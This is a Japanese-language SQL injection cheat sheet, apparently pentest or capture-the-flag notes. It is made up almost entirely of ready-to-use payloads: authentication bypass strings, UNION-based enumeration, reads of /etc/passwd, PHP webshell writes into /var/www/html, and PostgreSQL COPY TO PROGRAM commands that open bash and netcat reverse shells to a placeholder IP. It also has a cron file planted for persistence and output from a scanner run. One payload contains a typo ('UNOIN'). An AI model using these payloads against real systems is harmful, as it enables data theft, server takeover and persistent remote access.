# SQL Injectionとは
Webサイトの入力フォームなどを通じて、SQLに不正なコードを注入し、データベースの情報を盗み見たり、改ざん・削除したりするサイバー攻撃。

## 認証バイパス
```bash
' OR 1=1-- -
' OR 1=1--
' OR 1=1#
# 下記のペイロードはDBにadminというユーザーが存在する場合に有効
admin'-- -
```

## 脆弱性チェック
```bash
' # 構文エラー
' AND 1=1 -- # 正常に表示される
' AND 1=2 -- # 何も返らない、もしくはエラー、表示が変わるなど
```

## カラム数チェック
```bash
' ORDER BY 5-- - # エラーが起こればカラム数が4以下
```

## 画面に表示しているカラムチェック
```bash
# 2,3が表示された場合、2つ目と3つ目の要素が表示される
# 場合によってデータ型を合わせる
' UNION SELECT 1,2,3,4-- -
' UNION SELECT '1','2','3','4'-- -
```

## RDBMSチェック（カラム数の特定が必須, ここでは4とする）
```bash
# MySQL, MariaDB, MSSQLServer
' UNION SELECT null,version(),null,null-- -
' UNION SELECT null,@@version,null,null-- -
# PostgreSQL
' UNION SELECT null,version(),null,null-- -
# SQLite
' UNION SELECT null,sqlite_version(),null,null-- -
```

## MySQL, MariaDBで使用できるクエリ
```bash
# データベース名とユーザー名表示
' UNION SELECT null,database(),user(),null-- -
# ファイル読み込み
' UNOIN SELECT null,load_file('/etc/passwd'),null,null-- -
# ファイル書き込み
' UNION SELECT null,'<?php system($_GET["cmd"]);?>',null,null INTO OUTFILE '/var/www/html/webshell.php'-- -
' UNION SELECT null,'<?php system($_REQUEST["cmd"]);?>',null,null INTO OUTFILE '/var/www/html/webshell.php'-- -
```

## PostgreSQLで使用できるクエリ
```bash
# データベース名とユーザー名表示
' UNION SELECT null,current_database(),current_user,null-- -
# データ設定ディレクトリ表示
' UNION SELECT null,current_setting('data_directory'),null,null-- -
# ファイル読み込み
' UNION SELECT null,pg_read_file('/etc/passwd',0,1000),null,null-- -
' UNION SELECT null,pg_read_file('/etc/passwd')::text,null,null-- -
# lsコマンド使用
' UNION SELECT null,pg_ls_dir('/var/www/html'),null,null-- -
# webシェル書き込み
'; COPY (SELECT '<?php system($_GET["cmd"])?;>') TO '/var/www/html/shell.php';-- -
# RCE(権限に依存)
'; COPY (SELECT '') TO PROGRAM 'id > /tmp/id.txt';-- - idコマンド結果出力
'; COPY (SELECT '') TO PROGRAM 'bash -i >&/dev/tcp/<IP>/<Port> 0>&1';-- - bashのリバースシェル
'; COPY (SELECT '') TO PROGRAM 'bash -c "mkfifo /tmp/f; /bin/sh < /tmp/f | nc <IP> <Port> > /tmp/f"';-- -  名前付きパイプを使用したリバースシェル
# 毎分実行のcron
'; DROP TABLE IF EXISTS tmp_cron; CREATE TABLE tmp_cron(line text);-- -
'; INSERT INTO tmp_cron VALUES ('*/1 * * * * root bash -c ''bash -i >&/dev/tcp/<IP>/<Port> 0>&1''');-- -
'; COPY tmp_cron TO '/etc/cron.d/scheduler';-- -
```

## MSSQLServerで使用できるクエリ
```bash
' UNION SELECT null,DB_NAME(),SYSTEM_USER(),null-- -
```

## sqlicheck3r.py
簡易的なSQLインジェクションの脆弱性チェックツール(GETパラメータ)。
```bash
┌──(kali㉿kali)-[/tmp]
└─$ python3 sqlicheck3r.py   
[*] Input URL: http://example.com/index.php?id=1
[*] Target URL: http://10.129.229.137/room.php
[*] Target Parameter: id=1
[*] Checking SQLi vulnerability...
[!] Result: The page is VULNERABLE to SQLi.
[*] Scan completed.
```
